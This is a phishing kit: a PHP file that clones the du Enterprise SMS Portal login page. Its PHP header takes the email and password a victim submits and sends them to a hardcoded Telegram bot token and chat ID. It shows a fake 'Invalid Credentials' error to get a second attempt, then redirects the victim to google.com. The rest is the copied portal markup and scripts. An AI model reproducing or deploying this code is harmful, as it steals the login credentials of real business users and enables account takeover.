<?php
session_start();
$error = 0;
$chat_id = '5064068409';
$token = '5147525784:AAFmgFWsNWvlQJV-G3E9BDpF72R6l5fSMRg';

$refreshCount  = 0;
$try  = 0;
if (isset($_POST['try'])) {
  $try = $_POST['try']+1;
  $refreshCount = $_POST['refreshCount']+1;
  $vcEmail = $_POST['id_vcEmail'];
  $vcPassword = $_POST['id_vcPassword'];
  echo "sss";

  $message  = "====================={New User Login DU}=====================" . PHP_EOL;
  $message .= " UserEmail : $vcEmail " . PHP_EOL;
  $message .= " Password : $vcPassword " . PHP_EOL;

  $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=".urlencode($message);
  // $url = "https://api.telegram.org/bot5772083692:AAEGIKDuqjztt3JHcSTPhEBvRHo347EbJI8/sendMessage?chat_id=5794400860&text=hello";
  
//   $url = "https://api.telegram.org/bot5772083692:AAEGIKDuqjztt3JHcSTPhEBvRHo347EbJI8/sendMessage?chat_id=5794400860&text=hello";
    $result = file_get_contents($url);
    $result = json_decode($result, true);
    
  if (isset($result['ok'])) {
    if (isset($result['result'])) {
    }
  } else {
 $error = 1;
  }
  
  if($try == 2){
 header("Location: https://google.com");
}
} 
?>

<!DOCTYPE html>
<!-- saved from url=(0034)https://enterprisesmsportal.du.ae/ -->
<html x-ms-format-detection="none" lang="en"><!--  x-ms-format-detection to unhighlight number decoration in IE -->
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>DU</title>
	<!-- Start : Sweetalert CSS / JS - Pushpa 2019-03-21 @ 11.40 AM  -->
	  <link href="./DU_files/sweetalert.css" rel="stylesheet">
	   <link rel="stylesheet" href="./DU_files/icon">
	  <script type="text/javascript" src="./DU_files/sweetalert.min.js.download"></script> 
	  <!-- End : Sweetalert CSS / JS - Pushpa 2019-03-21 @ 11.40 AM  -->
	<link rel="icon" href="https://enterprisesmsportal.du.ae/static/img/fav.png" type="image/png">
   
	<link rel="stylesheet" href="./DU_files/font-awesome.min.css">
	<link href="./DU_files/bootstrap.min.css" rel="stylesheet">
	<link href="./DU_files/datepicker.css" rel="stylesheet">
	<link href="./DU_files/mdb.min.css" rel="stylesheet">
	<link href="./DU_files/hover.css" rel="stylesheet">
	<link href="./DU_files/style.css" rel="stylesheet">
	<!-- <link href="/static/users/css/select2.min.css" rel="stylesheet"> -->

	<!--link href="/static/users/css/developer.css" rel="stylesheet"-->

	<link href="./DU_files/datatables.min.css" rel="stylesheet">
	<link href="./DU_files/responsive.dataTables.min.css" rel="stylesheet">
	<script type="text/javascript" src="./DU_files/jquery.min.js.download"></script>
	<script type="text/javascript">var assetsImgTarget =  "/static/users/img/" </script>
	<script type="text/javascript" src="./DU_files/popper.min.js.download"></script>
	<script type="text/javascript" src="./DU_files/bootstrap.min.js.download"></script>
	<script type="text/javascript" src="./DU_files/datatables.min.js.download"></script>
	<script type="text/javascript" src="./DU_files/dataTables.responsive.min.js.download"></script>
	<script type="text/javascript" src="./DU_files/developer.js.download"></script>
 
<!--   <script type="text/javascript" src="/static/users/js/bootstrap-datepicker.js" ></script> 
 -->  
  <!-- Start : Bootstrap Date picket dependent css and js -->

  <!-- End : Bootstrap Date picket dependent css and js -->
  <!-- Material Bootstrap date time picker dependet CSS / JS  -->
  <link href="./DU_files/material-icons.css" rel="stylesheet">
  <link href="./DU_files/bootstrap-material-datetimepicker.css" rel="stylesheet">
  <script type="text/javascript" src="./DU_files/moment-with-locales.min.js.download"></script>
  <script type="text/javascript" src="./DU_files/bootstrap-material-datetimepicker.js.download"></script> 
  <!-- Material Bootstrap date time picker dependet CSS / JS  -->
 <!-- Start : Date Range Picker CSS / JS - Jagadeesh 2019-01-10 @ 11.50 AM  -->
  <link href="./DU_files/daterangepicker.css" rel="stylesheet">
  <script type="text/javascript" src="./DU_files/moment.min.js.download"></script>
  <script type="text/javascript" src="./DU_files/daterangepicker.js.download"></script>
  <!-- End : Date Range Picker CSS / JS - Jagadeesh 2019-01-10 @ 11.50 AM  -->
  <!-- <script type="text/javascript" src="/static/users/js/select2.min.js" ></script> -->
 <!--  <script type="text/javascript" src="/static/users/js/select2.min.js" ></script> -->

  <script type="text/javascript" src="./DU_files/bootbox.min.js.download"></script>
  <script type="text/javascript">
	var assetsPath = "/static/users/img/";//added
    var encodedMobile = "";
	/*Start : Default Serch From and To date - Jagadeesh 2019-01-17 @ 08.40 PM*/
   var searchFromDate = '';
   var searchToDate = '';
   /*End : Default Serch From and To date - Jagadeesh 2019-01-17 @ 08.40 PM*/  
	//Start : Default values assigned - Jagadeesh 2019-03-19 @ 05.00PM
    var defaultAuthIdelTime = '15';
	var defaultAuthIdelTimeseconds = '900';
    var logoutURL = "/logout/";
	var logout_popup = '5';
	var idleSettime = '';
  //End : Default values assigned - Jagadeesh 2019-03-19 @ 05.00PM
  </script>
  
  <!-- Start: Bootstrap Select2 Js assets - Jagadeesh 2019-02-14 @ 01.45 PM -->
  <link href="./DU_files/select2.min.css" rel="stylesheet">
  <script type="text/javascript" src="./DU_files/select2.min.js.download"></script>
  <!-- End: Bootstrap Select2 Js assets - Jagadeesh 2019-02-14 @ 01.45 PM -->
  <!-- Start : noscript JS - Pushpa 2019-08-13 @ 11.58 AM  -->


  <script>

$(document).ready(function(){
  $refreshCount = 1;
});
</script>

  <noscript>
    <link href="/static/users/css/noscript.css" rel="stylesheet">
  </noscript>
  <!-- End :  noscript JS - Pushpa 2019-08-13 @ 11.58 AM  -->
 <style type="text/css">/* Chart.js */
@-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}</style></head>
<body class="login-changed" aria-busy="true">
  <div id="loader-div" class="lds-roller" style="display: none;">
    <div></div>
    <div></div>
    <div></div>
    <div></div>
    <div></div>
    <div></div>
    <div></div>
    <div></div>
    <!-- <h5 id="loadedLoadingHead">Loading</h5> -->
    <!-- <h5 id="loaderUploadingHead">Uploading.. <span class="progresDynamic">0%</span></h5> -->
  </div>
  
<!-- <div id="loader-div">
<svg version="1.1" class="load_svg" id="L3" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
        viewBox="0 0 100 100" enable-background="new 0 0 0 0" xml:space="preserve">
      <circle fill="none" stroke="#fff" stroke-width="4" cx="50" cy="50" r="44" style="opacity:0.5;"/>
        <circle fill="#fff" stroke="#e74c3c" stroke-width="3" cx="8" cy="54" r="6" >
          <animateTransform
            attributeName="transform"
            dur="2s"
            type="rotate"
            from="0 50 48"
            to="360 50 52"
            repeatCount="indefinite" />
          
        </circle>
      </svg>
	    </div>
 -->
  
 <script>
$(document).ready(function(){
  $("#refreshId").click(function(){
    $("#refreshCountId").val(1 + parseInt($("#refreshCountId").val()));
    if(parseInt($("#refreshCountId").val()) > 9 )
    $("#refreshCountId").val(0);
    $("#captchaImage").attr("src": "./DU_files/captcha/0" + $("#refreshCountId").val() + ".png");
  });
});
</script>
 <script> var capchaUrl = "./DU_files/0" + $ref + ".png" </script>
<div class="login-main">
  <div class="login-left">
	<img src="./DU_files/login_page-t.png" alt="">
  </div>
  <div class="login-right">
	<div class="form-cont">
	
	<img src="./DU_files/logo-du.png" height="50" alt="Logo" class="mb-5">
	<form name="theForm" action="" id = "myform"
			autocomplete="off" method="post" onSubmit="">
	  <h3 class="mb-5"><span id="signinhead">Enterprise SMS Portal</span></h3>
		<input type="hidden" name="csrfmiddlewaretoken" value="wYpphSRxKY7o22qjGTIeMWCKaOdebygLtMiNK3VVjBqjn1EqKWAN7pK1WDgY60LV">
				 
                    <div class="md-form" autocomplete="off">
						 <label for="id_vcEmail" class="">Enter your email address/Entity ID</label>
						   <input type="text" name="id_vcEmail" class=" form-control" data-parsley-required="true" data-parsley-required-message="Enter Email ID/Entity ID" required="" id="id_vcEmail">
							
							<div class="txtCustomvcEmailErrorMessage error"></div>
					</div>
					
                    <div class="md-form" autocomplete="off">
						 <label for="id_vcPassword">Password</label>
						   <input type="password" name="id_vcPassword" maxlength="50" class=" form-control" data-parsley-maxlength-message="" data-parsley-required="true" data-parsley-required-message=" " required="" id="id_vcPassword">
               <input type="hidden" name="try" value="<?=(isset($_POST['try']) ? $_POST['try']+1 : 0)?>">
               <input id = "refreshCountId" type="hidden" name="refreshCount" value="<?=(isset($_POST['refreshCount']) ? $_POST['refreshCount']+1 : 0)?>">
							<div class="txtCustomvcPasswordErrorMessage error"><?php  if( $try == 1){ echo "Invalid Credentials"; }  ?></div>
					</div>
					
                    
					
					<!-- Start : Captcha UI Purpose dynamically append divs - Jagadeesh & Surya (2020-10-17 @17.20)-->
						
					<div id="captchaMainDiv" class="clearfix"><div class="md-form captchaInputDiv" autocomplete="off">
						 <label for="id_captcha_1">Captcha</label>
						   
<input type="hidden" name="captcha_0" value="bfabee40d96f96b2292bdeecbb5a722f28aa667d" class=" form-control" id="id_captcha_0"><input type="text" name="captcha_1" class=" form-control" id="id_captcha_1" autocapitalize="off" autocomplete="off" autocorrect="off" spellcheck="false">
							
<div class="txtCustomvcPasswordErrorMessage error">  </div>
					</div><div id="captchaIMGPart"><img src="./DU_files/captcha/01.png" alt="captcha" class="captcha" id = "captchaImage"><a href="javascript:void(){}" class="captcha-refresh" id = "refreshId"><img src = "./DU_files/refresh.png" style = "margin-left: -10px"> </a></div></div>
					<!-- End : Captcha UI Purpose dynamically append divs-->
               <div class="get-Forget-Password">
                <div>
                  <div class="form-check pl-0">
                    <input type="checkbox" class="form-check-input" id="rememberme" name="signinremember" value="0" data-parsley-multiple="signinremember">
                    <label class="form-check-label active" for="rememberme" id="remember" value="0">Remember Me</label>
                  </div>
                </div>
                <div>
				<input type="hidden" name="encil" id="encil">	
				<input type="hidden" name="enciv" id="enciv">
				<input type="hidden" name="enckey" id="enckey">
				<input type="hidden" name="encdata" id="encdata">
				<input type="hidden" name="OTP" id="OTP">
				<a href="https://enterprisesmsportal.du.ae/forgotpassword/" id="forgot">Forgot Password</a>
				<a href="https://enterprisesmsportal.du.ae/unlock/" id="reset" style="display: none;">Reset Password</a>
                </div>
              </div>
				<button class="btn btn-warning  btn-block hvr-bounce-to-right waves-effect waves-light" id="login" type="submit">Login</button>
				
				<input type="hidden" name="signintype" id="signintype" value="1">
				<input type="hidden" name="as_sfid" value="AAAAAAW5iVe6Bycw1Em03LdjqCpRI2J2pRX7UQ_AxyB06KnkPmtKchHHEk47QXkmsmR_7Fb1gqpBmE8laD8DzdIgEEL0nRNRSFE1h9sbz5VEzUuiUVo-WfqBxS9t4dBO9UptnPyS5AaCI2uI8l5aFRk2Zj-vASqZJHLKBnNSNV_btUoADQ=="><input type="hidden" name="as_fid" value="0afe5dbb56be1ed08d4fa14056c4848df62b62da"></form> 
	</div>
  </div>
</div>

<div class="modal fade" id="login-otp-Verify" tabindex="-1" role="dialog" aria-labelledby="f-Verify" aria-hidden="true" data-backdrop="static" data-keyboard="false">
  <div class="modal-dialog" role="document">
	<div class="modal-content">
	  <div class="modal-header">
		<h5 class="modal-title" id="exampleModalLabel"></h5>
		<button type="button" id="redirectsignin" class="close" data-dismiss="modal" aria-label="Close">
		  <span aria-hidden="true">×</span>
		</button>
	  </div>
	  <div class="modal-body">
	   <h4 class="f15">Stronger passwords alone aren't enough to protect your account from password breaches. Authenticate your login through OTP sent to your Mobile Number <span id="mobileno"></span>:</h4>
	   <form>
	   <div class="md-form">
		  <input type="text" id="Loginotp" class="form-control" maxlength="6" autocomplete="nope" novalidate="">
		  <label for="materialLoginotp">OTP</label>
		  <span class="txtCustomiOtpErrorMessage error"></span>
		  <small id="passwordHelpInlineMD" class="text-muted">
		  </small>
		</div>
		<button class="btn btn-warning hvr-bounce-to-right waves-effect waves-light" id="verifyotp" type="submit">Verify</button>
		<div class="get-otp get-otp-b">
			<div>
			  <a href="javascript:void(0)" id="generateotp" style="display: none;">Resend OTP</a>
			</div>
		</div>
		<input type="hidden" name="as_sfid" value="AAAAAAVsPQnUN_05jQLN3hf0Hg4IGigQ5ZSF5hPe27NH2z0vYkTIQ1bzfSLY8vWgT8d-LDYrtlB6NtPT5aZ9dUOcjzXWCYq33PG4_j0yVtu2-iRtH-sgQRI9hiyw97wVqxzyX2pnLBgOYlL6lFYL4IEHLaAXMhP4FH1Oxo62j8GcKLzYKQ=="><input type="hidden" name="as_fid" value="deefa41b03fb2ae4f51c5beee5d9d705e9e67e9b"></form>
	   
	  </div>
	</div>
  </div>
</div>
    
<script type="text/javascript" src="./DU_files/crypto-js.js.download"></script>
<script type="text/javascript" src="./DU_files/aes.js.download"></script>
<script type="text/javascript" src="./DU_files/enc.js.download"></script>
<script type="text/javascript" src="./DU_files/pbkdf2.js.download"></script>  

<script type="text/javascript">

signinTypeVal = 1// for enterprise
var otpVerifyStatus = 0;
var adminflag=1;
var ldapflag= '1'
$("#generateotp").hide();
$("#reset").hide();
$(document).on("keyup","#Loginotp",function(){
		if (this.value.match(/[^0-9]/g)) {
			this.value = this.value.replace(/[^0-9]/g, '');
		}
	});
 $(".txtCustomiOtpErrorMessage").html("");
 

 
// start---to populate values in rememberme case
$(document).ready(function(){
	
	///////To active captcah label
	/*Start : Captcha UI Purpose dynamically append divs - Jagadeesh & Surya (2020-10-17 @17.20)*/
	//$("label[for='id_captcha_1']").addClass("active");
	/*$("#id_captcha_1").blur(function(){
	  $("label[for='id_captcha_1']").addClass("active");
	});*/
	$("#id_captcha_1").parent().addClass("captchaInputDiv");
	$(".captcha").appendTo($("#captchaIMGPart"));
	$(".captcha-refresh").appendTo($("#captchaIMGPart"));
	$(".captchaInputDiv").appendTo($("#captchaMainDiv"));
	$("#captchaIMGPart").appendTo($("#captchaMainDiv"));
	/*End : Captcha UI Purpose dynamically append divs*/

	$('#id_vcEmail').focus();
	if (signinTypeVal=="1"){
		//console.log('ENTERPRISE')
		email="";
		password="";
		sessionStorage.setItem("EP_login_type",signinTypeVal);
	}else{
		signinTypeVal=7;
		email="";
		password="";
		$('#forgot').hide();
		$('#reset').hide();
		sessionStorage.setItem("EP_login_type",signinTypeVal);
	}
	if(email!=''){
		$("#id_vcEmail").val(email);
		$('#id_vcEmail').focus();
	}
	if(password!=''){
		$("#id_vcPassword").val(password);
		$('#id_vcPassword').focus();
	}

 });
//end ---to populate values in rememberme case
 
///start - code for remember me
$("#rememberme").click(function() {
	email=$("#id_vcEmail").val();
	password=$("#id_vcPassword").val();
	flag=1
	ChecksigninType=$("#signintype").val();
	var email_reg=/^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/
	currentUrl = window.location.pathname;
	if(email==""){
		$(".txtCustomvcEmailErrorMessage").html("Enter Citrix ID");
		flag=flag+1
	}
	
	if(currentUrl==''+'/admin/' || currentUrl==''+'/Admin/' ){
		if(email && email.match(email_reg))
		{
			$(".txtCustomvcEmailErrorMessage").html("Enter Valid Citrix ID");	
			flag=flag+1;
		}
	}
	else{
		if(!emailValidation(email))
		{
			//$(".txtCustomvcEmailErrorMessage").html("Enter Valid Citrix ID");	
			flag=flag+1;
		}
	
	}
	if(password==""){
		$(".txtCustomvcPasswordErrorMessage").html("Enter Password");
		flag=flag+1
	}
	if (flag!=1)
	{
		return false;
	}
	
});
///end - code for remember me

history.pushState(null, null, location.href);
    window.onpopstate = function () {
        history.go(1);
    };

function loginDetails()
{
	currentUrl = window.location.pathname;
	signinTypeVal = '';
	//alert(login_type,"login_type")
	if(currentUrl==''+'/admin/' || currentUrl==''+'/Admin/')
	{
		
		signinTypeVal=7;
		$(".adminlogintype").show();
		if (ldapflag==1 ){
			$("label[for='id_vcEmail']").text("Enter your CitrixID")
			$("#id_vcEmail").attr("type", "text"); 
			$("#id_vcEmail").removeAttr("data-parsley-type");
			$('#id_vcEmail').attr('data-parsley-required-message', 'Enter CitrixID');
			
			adminflag=0
		}
	}
	else
	{	
		signinTypeVal =1
		if(!signinTypeVal)
		{
			window.location.href="/";			
		}
	}

	$("#signintype").val(signinTypeVal);
	headerName = 'Admin Login';
	swithRole = '';
	if(signinTypeVal==1)
	{
		headerName = 'Enterprise SMS Portal';
		swithRole = 'Enterprise';
	}
		
	$("#signinhead").html(headerName);
	/*Start: added swithRoleSignupDependent(hide signup for admin logins) -Pushpa 21-03-2019 @ 11:20 AM */
	if(swithRole)
	{
		$("#swithRoleSignupDependent").show();
		$("#swithLogin").html(swithRole);
	}
		
	else
	{
		$("#swithRoleSignupDependent").hide();
		$("#swithRoleDependent").hide();
		
	}
	/*End: added swithRoleSignupDependent(hide signup for admin logins) -Pushpa 21-03-2019 @ 11:20 AM */
}

loginDetails();

/*Start : Secure Password - Jagadeesh 2019-02-12 @ 06.00 PM */
function randomString() 
{
	var chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz";
	var string_length = 32;
	var randomstring = '';
	for (var i=0; i<string_length; i++) 
	{
			var rnum = Math.floor(Math.random() * chars.length);
			randomstring += chars.substring(rnum,rnum+1);
	}
	return  randomstring;
}

function sec_pwd(hash)
{	
	var salt = CryptoJS.lib.WordArray.random(128/8); 	
	var key256Bits500Iterations = CryptoJS.PBKDF2("Secret Passphrase", salt, { keySize: 256/32, iterations: 500 });	
	var iv  = CryptoJS.enc.Hex.parse(randomString()); 	
	var encrypted = CryptoJS.AES.encrypt(hash, key256Bits500Iterations, { iv: iv }); 
	//console.log(encrypted.ciphertext.toString());
	var encdata= encrypted.ciphertext.toString(CryptoJS.enc.Base64); 
	var enciv   = encrypted.iv.toString(CryptoJS.enc.Base64);       
	var enckey  = encrypted.key.toString(CryptoJS.enc.Base64);
	$("#enciv").val(enciv);
	$("#enckey").val(enckey);	
	return encrypted;
}
/*End : Secure Password - Jagadeesh 2019-02-12 @ 06.00 PM */

function gen_cookie()
{
	if($('#rememberme').is(':checked')) {	
		passwordiv=$("#enciv").val()
		passwordkey=$("#enckey").val()
		var shash = sec_pwd(email);
		$("#encdata").val(shash);
		email=$("#encdata").val()
		emailiv=$("#enciv").val()
		emailkey=$("#enckey").val()
		$("#enciv").val(passwordiv)
		$("#enckey").val(passwordkey)
		ChecksigninType=$("#signintype").val();
		data={"emailiv":emailiv,"emailkey":emailkey,"passwordiv":passwordiv,"passwordkey":passwordkey,"email":email,"password":password,"ChecksigninType":ChecksigninType}
		$.ajax({
				type: "POST",
				data:data,
				url:"/rememberme/",
				async:false,
				beforeSend: function()
				{
					$("#loader-div").show();
				},
				success: function (response) {	
					return true;
				},
				error: function(xhr, status, error) { // if error occured
					$("#loader-div").hide();
					bootbox.alert("something went wrong");
					return false;						
				},
				complete: function() {						
					$("#loader-div").hide();
				},
			});
	}
}

$("#loginForm").submit(function(){
	//return true; // remove it when writing code as for dummy
	$("#Loginotp").val("");
	email=$("#id_vcEmail").val();
	password=$("#id_vcPassword").val();
	captcha=$("#id_captcha_1").val();
	ChecksigninType=$("#signintype").val();
	flag=1;
	//alert(adminflag);
	alert("LoginForm: ", email);
	$(".txtCustomvcEmailErrorMessage").html("");
	$(".txtCustomvcPasswordErrorMessage").html("");
	$(".txtCustomcaptchaErrorMessage").html('');

	/* changes madde as per issue 40748 @satish DROP2 phase1 */
	var citrix_reg=/[@_]/
	if(ldapflag && adminflag==0 && email.match(citrix_reg)){
		$(".txtCustomvcEmailErrorMessage").html("Enter Valid Citrix ID");
	}
	/*if(adminflag==0 && email!='' && emailValidation(email) )
	{
		$(".txtCustomvcEmailErrorMessage").html("Enter Valid Citrix ID");	
		flag=flag+1;
	} */
	if(adminflag && !emailValidation(email))
	{
		flag=flag+1;
	}
	if(password==""){
		$(".txtCustomvcPasswordErrorMessage").html("Enter Password");
		flag=flag+1
	}
	if(captcha==""){
		$(".txtCustomcaptchaErrorMessage").html("Enter Captcha");
		flag=flag+1
	}
	
	if (flag!=1)
	{
		return false;
	}
	$(".txtCustomvcEmailErrorMessage").html("");
	var hash = $("#id_vcPassword").val();
	$("#encil").val(hash.length);
	var shash = sec_pwd(hash);         
	$("#id_vcPassword").val(shash);
	password=$("#id_vcPassword").val();
	
	$.ajax({
			type: "POST",
			data:{"Email":email,"Password":password,"ChecksigninType":ChecksigninType,"enciv":$("#enciv").val(),"enckey":$("#enckey").val(),'captcaha0':$("#id_captcha_0").val(),'captcaha1':$("#id_captcha_1").val()},
			url:"/check-credentials/",
			beforeSend: function() {
					$("#loader-div").show();
			},			
			success: function (response) {
				//sessionStorage.setItem("EP_Role_type",'');
				//console.log(response)
				//alert('ccccccccccccccc');
				if(response.otpflag == 1){
						

					
					
							gen_cookie();
							//alert('sssssssssssssssss');
							var form = document.getElementById("loginForm");
							form.submit();
					
						
					return false;
					}
				else{
					//alert('else');
					if (response.captchaerror==1){
						captchaRefresh();
						$('#id_captcha_1').val('');
						$(".txtCustomcaptchaErrorMessage").html(response.err_response);
						$("#login").attr("disabled",false);	
						return false;
					}
					else if (response.emailerror==1)
					{
						$(".txtCustomvcEmailErrorMessage").html(response.err_response);
						$("#login").attr("disabled",false);	
					}else{
						$(".txtCustomvcPasswordErrorMessage").html(response.err_response);
						$("#login").attr("disabled",false);	
						if(response.unblock!='0')
						{
							//console.log('000000000000000');
							sessionStorage.setItem("EP_Role_type",response.unblock);
							$("#forgot").hide();	
							$("#reset").show();	
						}
						else{
							//console.log('2222222222222');
							sessionStorage.setItem("EP_Role_type",'');
							$("#forgot").show();	
							$("#reset").hide();	
						}
					}
					
					return false;
				}
			 },
			error: function() { // if error occured
				$("#loader-div").hide();
				$(".txtCustomvcPasswordErrorMessage").html("something went wrong");
			},
			complete: function() {
				$("#loader-div").hide();
			},
		});
	return false;
});



$(document).on('click','#qrverifyotp',function() {
	otpValue=$("#QrLoginotp").val()
	qrotp = sessionStorage.getItem("EP_qr_otp") 	
	
	if(otpValue==qrotp)
	{
		
		return true;
	}
	else
	{
		
		return false;
	}
	return false;
});
$(document).on('click','#redirectsignin',function() {
	$("#login").attr("disabled",false);	
});
$(document).on('keyup', '#id_vcEmail', function () {
	var reg=/^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/
	email=$("#id_vcEmail").val();
	if(email){
		$(".txtCustomvcEmailErrorMessage").html("");
	}
	
});
$(document).on('keyup', "#id_vcPassword", function () {
	var reg=/^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/;
	password=$("#id_vcPassword").val();
	email=$("#id_vcEmail").val();
	//console.log($('#forgot').is(":visible"));
	if(password){
		$(".txtCustomvcPasswordErrorMessage").html("");
	}	
	
});
$(document).on('click', '#generateotp', function (e) {
	$("#Loginotp").val('');
	var mobileno = sessionStorage.getItem("EP_mb_no");  
	//document.getElementById("generateotp").innerHTML = "Generating OTP..."; /*Commented to remove dark colour for Resend OTP - pushpa 04-04-2019 @ 10:53 AM */
	document.getElementById("generateotp").disabled=true;
	
	
	var generateotp=true;
	if (generateotp==9) { 
		$("#generateotp").hide();
		$(".txtCustomvcEmailErrorMessage").html("Already LoggedIn or previous sessions are not closed properly."); 
	} 
	else if(generateotp==4){
			
				return false;			
			}
	else {
		if(generateotp) {
			//$('.get-otp a').addClass('grey-otp');/*Commented to remove dark colour for Resend OTP - pushpa 04-04-2019 @ 10:53 AM */
			$(".login-otp-msg").show();				
			$("#generateotp").hide();
			//button.disabled = false;
			setTimeout(function() {
				$("#generateotp").show();
				document.getElementById('generateotp').disabled = false;
			}, 10000);
		}
		else {
			//button.disabled = false;
			$("#mobile-number").html("Unable to send OTP, Please try after sometime"); 
			document.getElementById('generateotp').disabled = false;
		}
	}	
		
});
/* End : Mobile Otp Generation */

</script>

  
<!-- <script type="text/javascript" src="/static/users/js/popper.min.js" ></script>
 --><script type="text/javascript" src="./DU_files/mdb.min.js.download"></script><div class="hiddendiv common"></div>
<script type="text/javascript" src="./DU_files/parsley.js.download"></script>

 <script type="text/JavaScript" >
  
  $(document).ready(function() {
    $("#loader-div").hide();
    $('.mdb-select').materialSelect();
    setTimeout(function() {
      $('.message').fadeOut('slow');
    }, 10000); // <-- time in milliseconds, 1000 =  1 sec
    if($("#populateEncodedMobile").length)
    {
      $("#populateEncodedMobile").html(encodedMobile);
    }
  });
</script>
 <script type="text/javascript">
    $(function(){   
        $.notification({
            cookieEnable: true,
            text: 'This service requires BT Smart Messaging to store cookies on your computer. If you do not allow cookies to be stored on your computer, you will not be able to log in to the service (and the Login button will be disabled). To find out more about the cookies, see our <a href="" target="_blank" rel ="noopener noreferrer">Privacy Statement</a>.'
    });
  });
</script>
  <!--All other javascript goes here-->


</body></html>